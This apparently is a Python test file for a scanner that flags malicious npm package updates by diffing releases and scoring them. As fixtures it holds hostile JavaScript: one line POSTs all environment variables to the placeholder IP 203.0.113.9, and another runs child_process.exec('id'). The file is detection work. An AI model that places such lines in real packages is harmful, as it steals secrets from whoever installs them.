"""Two sure Jev answers plus a hostile literal floor the score at review."""

from hunter.bands import REVIEW_THRESHOLD
from hunter.classify import classify_files, jev_consensus
from hunter.head import load_head
from hunter.jev import JevResult, NoulView
from hunter.models import CodeFeatures, ReleaseMeta
from hunter.triage import added_lines, unified_diff
from hunter.fake_jev import KeywordJev


def _meta() -> ReleaseMeta:
    return ReleaseMeta(
        ecosystem="npm",
        name="widget",
        old_version="1.0.0",
        new_version="1.0.1",
        rank=4,
        registry_url="https://example.test/widget",
    )


class SureJev(KeywordJev):
    """Answers 0.95 for network and credential read, 0.01 for everything else."""

    def system_one(self, state: dict, questions: dict) -> JevResult:
        result = super().system_one(state, questions)
        nouls = {
            key: NoulView(noul=0.95 if key in {"network", "credential_read"} else 0.01)
            for key in result.nouls
        }
        return JevResult(model=result.model, nouls=nouls, choices=result.choices, scores=result.scores)


def test_consensus_needs_two_sure_answers_and_a_literal():
    sure = {"network": 0.95, "credential_read": 0.92}
    assert jev_consensus(sure, CodeFeatures(literal_raw_ip=True))
    assert not jev_consensus(sure, CodeFeatures())
    assert not jev_consensus({"network": 0.95, "credential_read": 0.5}, CodeFeatures(literal_raw_ip=True))


def test_consensus_floors_a_low_head_score_at_review():
    old = {"index.js": "function add(a, b) {\n  return a + b;\n}\nmodule.exports = add;\n"}
    hostile = (
        "const https = require('https');\n"
        "https.request({ host: '203.0.113.9', method: 'POST' }).end(JSON.stringify(process.env));\n"
    )
    new = {"index.js": old["index.js"] + hostile}
    result = classify_files(meta=_meta(), old_files=old, new_files=new, jev=SureJev(), head=load_head())
    assert "jev_consensus" in result.signals
    assert result.malice_probability >= REVIEW_THRESHOLD
    assert result.band in {"review", "alert"}


def test_a_change_on_a_last_line_without_newline_is_kept():
    diff = unified_diff("a.js", "x = 1", "x = 1; require('child_process').exec('id')")
    assert "child_process" in added_lines(diff)
